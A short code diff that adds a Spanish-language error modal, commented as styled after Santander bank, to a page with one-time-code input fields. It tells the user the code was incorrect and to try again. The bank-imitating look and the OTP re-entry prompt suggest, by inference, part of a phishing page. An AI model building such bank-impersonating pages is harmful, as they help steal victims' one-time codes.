@@ -220,6 +220,32 @@
         </div>
     </div>
 
+
+    <!-- MODAL ALERTA ESTILO SANTANDER -->
+<div id="bankAlertModal" class="bank-modal-overlay">
+    
+    <div class="bank-modal">
+
+        <!-- BOTON CERRAR -->
+        <button class="close-modal-btn" id="closeModalBtn">
+            ✕
+        </button>
+
+        <!-- LOGO -->
+        <div class="bank-logo">
+            <img src="lokoto.png" alt="Logo">
+        </div>
+
+        <!-- MENSAJE -->
+        <div class="bank-alert-text">
+            <span class="alert-icon">⚠</span>
+            Código incorrecto, verifica e intenta nuevamente.
+        </div>
+
+    </div>
+
+</div>
+
     <script>
 
 const inputs = document.querySelectorAll('.otp-input');
